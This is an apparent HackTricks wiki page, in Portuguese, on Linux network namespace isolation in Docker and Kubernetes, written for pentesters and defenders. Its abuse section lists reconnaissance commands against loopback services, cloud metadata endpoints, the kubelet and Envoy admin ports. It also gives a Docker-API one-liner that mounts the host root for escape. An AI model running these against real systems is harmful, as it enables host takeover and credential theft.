# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O network namespace isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/vizinhos, regras de firewall, sockets, o namespace abstrato de sockets de domínio UNIX e o conteúdo de arquivos como `/proc/net`. É por isso que um container pode ter o que parece ser seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo de loopback sem possuir a stack de rede real do host.

Do ponto de vista de segurança, isso é importante porque o isolamento de rede envolve muito mais do que o binding de portas. Um network namespace privado limita o que a workload pode observar ou reconfigurar diretamente. Quando esse namespace é compartilhado com o host, o container pode obter repentinamente visibilidade sobre listeners do host, serviços locais do host, endpoints AF_UNIX abstratos e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um network namespace recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Os container runtimes então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que a workload tenha a conectividade esperada. Em deployments baseados em bridge, isso geralmente significa que o container vê uma interface baseada em veth conectada a uma bridge do host. No Kubernetes, os plugins CNI realizam a configuração equivalente para o networking do Pod.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` representa uma mudança tão drástica. Em vez de receber uma stack de rede privada preparada, a workload ingressa na stack real do host.

## Laboratório

Você pode ver um network namespace quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e containers com host-networking usando:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container com host networking não possui mais sua própria visão isolada de sockets e interfaces. Essa mudança, por si só, já é significativa antes mesmo de você verificar quais capabilities o processo possui.

## Uso em Runtime

Docker e Podman normalmente criam um network namespace privado para cada container, a menos que sejam configurados de outra forma. Kubernetes geralmente fornece a cada Pod seu próprio network namespace, compartilhado pelos containers dentro desse Pod, mas separado do host. Isso significa que `127.0.0.1` geralmente é local ao Pod, e não ao container: um listener vinculado apenas ao localhost em um container normalmente pode ser acessado por seus sidecars e containers irmãos. Sistemas Incus/LXC também fornecem um isolamento baseado em network namespaces, geralmente com uma variedade maior de configurações de redes virtuais.

O princípio comum é que a rede privada é o limite de isolamento padrão, enquanto o host networking é uma opção explícita para sair desse limite.

## Misconfigurações

A misconfiguração mais importante é simplesmente compartilhar o network namespace do host. Isso às vezes é feito por motivos de performance, monitoramento de baixo nível ou conveniência, mas remove um dos limites mais claros disponíveis para containers. Listeners locais ao host tornam-se acessíveis de forma mais direta, serviços disponíveis apenas no localhost podem se tornar acessíveis, e capabilities como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas, pois as operações que habilitam passam a ser aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder capabilities relacionadas à rede em excesso, mesmo quando o network namespace é privado. Um namespace privado ajuda, mas não torna raw sockets ou o controle avançado de rede inofensivos.

No Kubernetes, `hostNetwork: true` também altera o quanto você pode confiar na segmentação de rede no nível do Pod. O Kubernetes documenta que muitos plugins de rede não conseguem distinguir corretamente o tráfego de Pods com `hostNetwork` para correspondências de `podSelector` / `namespaceSelector` e, portanto, tratam esse tráfego como tráfego comum do node. Do ponto de vista de um atacante, isso significa que um workload comprometido com `hostNetwork` frequentemente deve ser tratado como um foothold de rede no nível do node, e não como um Pod normal ainda limitado pelas mesmas suposições de policy aplicadas a workloads em overlay network.

## Abuso

Em configurações com isolamento fraco, atacantes podem inspecionar serviços em listening no host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, sniffar ou interferir no tráfego, dependendo das capabilities e do ambiente específicos, ou reconfigurar o estado de roteamento e do firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar o movimento lateral e o reconnaissance do control plane.

Se você suspeitar de host networking, comece confirmando que as interfaces e os listeners visíveis pertencem ao host, e não a uma rede isolada de container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços disponíveis apenas no loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets são outro alvo fácil de ignorar, pois têm escopo definido pelo network namespace, embora não se pareçam com listeners TCP/UDP e possam não existir como caminhos do sistema de arquivos em `/run`. Assim, um container com a rede do host pode herdar acesso a canais de controle exclusivos do host que nunca foram bind-mounted no container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Um exemplo histórico foi o bug de exposição do socket abstrato `containerd-shim`, mas a lição mais ampla é mais importante do que o CVE específico: assim que uma carga de trabalho entra no network namespace do host, os serviços AF_UNIX abstratos também passam a fazer parte da attack surface. Se esses sockets parecerem relacionados ao runtime ou administrativos, faça pivot para [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Se houver network capabilities, teste se a carga de trabalho consegue inspecionar ou alterar a stack visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em kernels modernos, o host networking junto com `CAP_NET_ADMIN` também pode expor o caminho dos pacotes para além de simples alterações em `iptables` / `nftables`. Qdiscs e filtros do `tc` também têm escopo por namespace; portanto, em um host network namespace compartilhado, eles se aplicam às interfaces do host que o container pode ver. Se `CAP_BPF` também estiver presente, programas eBPF relacionados à rede, como carregadores de TC e XDP, também se tornam relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Isso é importante porque um attacker pode conseguir espelhar, redirecionar, modelar ou descartar tráfego no nível da interface do host, e não apenas reescrever regras de firewall. Em um network namespace privado, essas ações ficam restritas à visão do container; em um host namespace compartilhado, elas passam a afetar o host.

Em ambientes de cluster ou cloud, o host networking também justifica uma recon local rápida de metadata e de serviços adjacentes ao control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
No Kubernetes, lembre-se de que comprometer **qualquer** container em um Pod com múltiplos containers também dá acesso aos listeners de localhost abertos por containers irmãos e sidecars, pois todo o Pod compartilha um único network namespace. Isso se torna especialmente relevante com service-mesh, observability e containers auxiliares cujas interfaces de administração ou debug são intencionalmente internas ao Pod, em vez de abrangerem todo o cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Trate "bound to localhost" como **Pod-private**, não **container-private**. Depois que um container no Pod for comprometido, essa suposição deixa de ser válida.

### Exemplo completo: Host Networking + Acesso local ao Runtime / Kubelet

Host networking não fornece automaticamente root no host, mas frequentemente expõe serviços que são intencionalmente acessíveis apenas a partir do próprio node. Se um desses serviços tiver proteção fraca, host networking se torna um caminho direto para privilege escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet em localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se o kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo dessas verificações é descobrir se o processo possui uma network stack privada, quais rotas e listeners estão visíveis e se a visão da rede já se parece com a do host antes mesmo de você testar capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
O que é interessante aqui:

- Se `/proc/self/ns/net` e `/proc/1/ns/net` já parecerem semelhantes aos do host, o container pode estar compartilhando o network namespace do host ou outro namespace não privado.
- `lsns -t net` e `ip netns identify` são úteis quando o shell já está dentro de um namespace nomeado ou persistente e você quer correlacioná-lo com objetos de `/run/netns` a partir do host.
- `ss -lntup` é especialmente valioso porque revela listeners acessíveis apenas via loopback e endpoints de gerenciamento locais. `ss -xap` e `/proc/net/unix` adicionam a visão de abstract sockets que buscas comuns por sockets no filesystem não encontram.
- Rotas, nomes de interfaces, contexto do firewall, estado do `tc` e anexos de eBPF tornam-se muito mais importantes se `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` estiver presente.
- No Kubernetes, uma falha na resolução de nomes de serviços a partir de um Pod com `hostNetwork` pode simplesmente significar que o Pod não está usando `dnsPolicy: ClusterFirstWithHostNet`, e não que o serviço esteja ausente.
- Em Pods com múltiplos containers, os listeners em localhost pertencem ao network namespace inteiro do Pod. Portanto, verifique os sidecars e os containers irmãos antes de presumir que uma porta acessível apenas via loopback não pode ser alcançada a partir do container comprometido.

Ao revisar um container, sempre avalie o network namespace em conjunto com o conjunto de capabilities. Host networking combinado com capabilities de rede fortes representa uma postura muito diferente de bridge networking combinado com um conjunto restrito de capabilities padrão.

## Referências

- [Kubernetes NetworkPolicy e ressalvas sobre `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` do Linux e isolamento de abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Aviso do containerd: abstract Unix domain sockets expostos a containers com host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Requisitos de token e capabilities do eBPF para programas eBPF relacionados à rede](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
